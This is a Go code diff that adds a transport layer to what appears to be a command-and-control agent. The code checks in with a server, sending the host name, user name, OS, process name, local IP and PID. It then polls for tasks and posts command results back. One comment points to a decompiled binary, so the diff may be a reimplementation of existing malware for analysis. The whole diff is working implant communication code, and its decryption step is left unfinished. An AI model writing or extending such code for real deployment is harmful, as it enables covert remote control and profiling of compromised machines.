@@ -15,9 +15,11 @@ package main
 import (
 	"crypto/sha256"
 	"encoding/binary"
+	"encoding/json"
 	"errors"
 	"io"
 	"net"
+	"runtime"
 	"sync"
 	"time"
 )
@@ -132,6 +134,104 @@ func deriveSessionKeys(verify, salt string) sessionKeys {
 	copy(sk.key0[:], h[:16])
 	copy(sk.key2[:], h[16:32])
 	return sk
+}
+
+// newRealTransport creates a pooled TCP transport (main.go "tcp"/"raw" mode).
+func newRealTransport(addr, verify, salt string) Transport {
+	tr := &transportReal{cfg: transportCfg{hostname: addr, verify: verify, salt: salt}}
+	return &realTransport{inner: tr}
+}
+
+// realTransport adapts transportReal to the Transport interface.
+type realTransport struct {
+	inner *transportReal
+}
+
+// Checkin performs the agent check-in over the pooled connection.
+func (r *realTransport) Checkin() (*CheckinResponse, error) {
+	conn, err := r.inner.getOrCreateConnection()
+	if err != nil {
+		return nil, err
+	}
+	if conn.sessKeys.key0 == [16]byte{} {
+		conn.sessKeys = deriveSessionKeys(r.inner.cfg.verify, r.inner.cfg.salt)
+	}
+	req := CheckinRequest{
+		VerifyKey:   VerifyKey,
+		HostName:    hostname,
+		UserName:    username,
+		OsName:      runtime.GOOS,
+		ProcessName: processName,
+		LocalIP:     localIP,
+		Arch:        runtime.GOARCH,
+		PID:         pid,
+		Version:     agentVersion,
+	}
+	body, _ := json.Marshal(req)
+	if err := conn.sendFrame(&conn.sessKeys, &conn.counter, body); err != nil {
+		return nil, err
+	}
+	frame, err := conn.readFrame()
+	if err != nil {
+		return nil, err
+	}
+	// frame = [16B IV][ct]; strip IV, decrypt not yet available — return raw
+	var cr CheckinResponse
+	if len(frame) > 16 {
+		if err := json.Unmarshal(frame[16:], &cr); err == nil && cr.ClientID > 0 {
+			clientID = cr.ClientID
+		}
+	}
+	return &cr, nil
+}
+
+// GetTasks polls pending tasks.
+func (r *realTransport) GetTasks() ([]TaskItem, error) {
+	conn, err := r.inner.getOrCreateConnection()
+	if err != nil {
+		return nil, err
+	}
+	req, _ := json.Marshal(map[string]interface{}{"type": "task_poll", "client_id": clientID, "verify_key": VerifyKey})
+	if err := conn.sendFrame(&conn.sessKeys, &conn.counter, req); err != nil {
+		return nil, err
+	}
+	frame, err := conn.readFrame()
+	if err != nil {
+		return nil, err
+	}
+	var tr TaskResponse
+	if len(frame) > 16 {
+		if err := json.Unmarshal(frame[16:], &tr); err == nil {
+			if tr.Interval > 0 {
+				sleepTime = tr.Interval
+			}
+			return tr.Tasks, nil
+		}
+	}
+	return nil, nil
+}
+
+// SendResult submits a task result.
+func (r *realTransport) SendResult(taskID int64, result, status string) error {
+	conn, err := r.inner.getOrCreateConnection()
+	if err != nil {
+		return err
+	}
+	req, _ := json.Marshal(ResultRequest{ClientID: clientID, CommandID: taskID, Result: result, Status: status, VerifyKey: VerifyKey})
+	return conn.sendFrame(&conn.sessKeys, &conn.counter, req)
+}
+
+// Close closes the pooled connection.
+func (r *realTransport) Close() error {
+	r.inner.mu.Lock()
+	defer r.inner.mu.Unlock()
+	for e := r.inner.pool; e != nil; e = e.next {
+		if e.conn != nil && e.conn.nc != nil {
+			e.conn.nc.Close()
+		}
+	}
+	r.inner.pool = nil
+	return nil
 }
 
 // foldCompare is the fold-compare used by the pool (DAT_1e2f00a0 semantics).
